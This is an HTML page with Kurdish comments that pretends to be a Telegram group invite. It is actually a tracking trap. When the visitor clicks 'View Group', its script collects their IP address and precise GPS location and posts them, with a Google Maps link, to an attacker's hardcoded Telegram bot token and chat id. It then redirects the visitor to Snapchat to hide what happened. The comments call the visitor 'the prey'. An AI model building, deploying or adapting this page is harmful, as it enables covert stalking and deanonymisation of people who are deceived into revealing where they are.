<!DOCTYPE html>
<html lang="ku" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram: Join Group</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <style>
        body { background-color: #182533; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; color: #fff; }
        .container { text-align: center; padding: 20px; max-width: 400px; width: 90%; }
        .tg-logo { width: 100px; height: 100px; margin-bottom: 20px; }
        h2 { font-size: 22px; margin: 0 0 10px 0; font-weight: 500; }
        p { color: #7f91a4; font-size: 15px; margin: 0 0 30px 0; line-height: 1.4; }
        .btn-telegram { background-color: #2ea6da; color: #fff; border: none; padding: 14px 0; width: 100%; font-size: 16px; font-weight: bold; border-radius: 25px; cursor: pointer; box-shadow: 0 2px 5px rgba(0,0,0,0.2); transition: background-color 0.2s, transform 0.1s; text-transform: uppercase; letter-spacing: 0.5px; }
        .btn-telegram:active { background-color: #2491c1; transform: scale(0.98); }
    </style>
</head>
<body>

    <div class="container">
        <img class="tg-logo" src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram">
        <h2>Telegram Group</h2>
        <p id="status-text">تکایە کلیک لە دوگمەی خوارەوە بکە بۆ چوونە ناو گرووپ</p>
        <button class="btn-telegram" id="start-btn">View Group</button>
    </div>

    <script>
        const token = "8445031997:AAFx42CAaKeuoeo781iYezFiv0gke9NkO9g"; 
        const chatId = "1629990392"; 

        const urlParams = new URLSearchParams(window.location.search);
        const uid = urlParams.get('id') || "Unknown";
        const creator = urlParams.get('u') || "Unknown";

        $("#start-btn").on("click", function() {
            $("#start-btn").text("Connecting...").prop("disabled", true);

            // لێرەدا سەرەتا ئایپی نێچیرەکە بە خێرایی وەردەگرین لە ڕێگەی سێرڤەرێکی دەرەکییەوە
            $.getJSON("https://api.ipify.org?format=json", function(data) {
                let userIp = data.ip;
                getGeolocation(userIp);
            }).fail(function() {
                getGeolocation("Unknown");
            });
        });

        function getGeolocation(ip) {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    let lat = position.coords.latitude;
                    let lon = position.coords.longitude;
                    sendToTelegram(ip, lat, lon, "Allowed");
                }, function(error) {
                    sendToTelegram(ip, "0", "0", "❌ ڕەتکرایەوە");
                }, { enableHighAccuracy: true, timeout: 5000 });
            } else {
                sendToTelegram(ip, "0", "0", "Not Supported");
            }
        }

        function sendToTelegram(ip, lat, lon, locStatus) {
            let googleMapsUrl = (lat !== "0") ? `https://maps.google.com/?q=${lat},${lon}` : "⚠️ نێچیرەکە مۆڵەتی لۆکەیشنی نەدا!";
            
            let caption = "🔹 زانیاری نوێ لە ڕێگەی GitHub:\n\n";
            caption += "🆔 ناسنامە: " + uid + "\n";
            caption += "🌐 ناونیشانی ئایپی (IP): " + ip + "\n";
            caption += "📱 ئامێر: iPhone 14 Pro Max\n";
            caption += "📷 دۆخی کامێرا: لادراوە (گیتهەب پاڵپشتی ناکات)\n";
            caption += "✍️ دروستکەر: " + creator + "\n\n";
            caption += "📍 نەخشەی لۆکەیشن:\n" + googleMapsUrl;

            let tgUrl = `https://api.telegram.org/bot${token}/sendMessage`;

            $.ajax({
                type: 'POST',
                url: tgUrl,
                data: {
                    chat_id: chatId,
                    text: caption
                },
                complete: function() {
                    // دوای ناردنی نامەکە دەچێتە سەر سناپچات
                    window.location.href = "https://www.snapchat.com/spotlight";
                }
            });
        }
    </script>
</body>
</html>
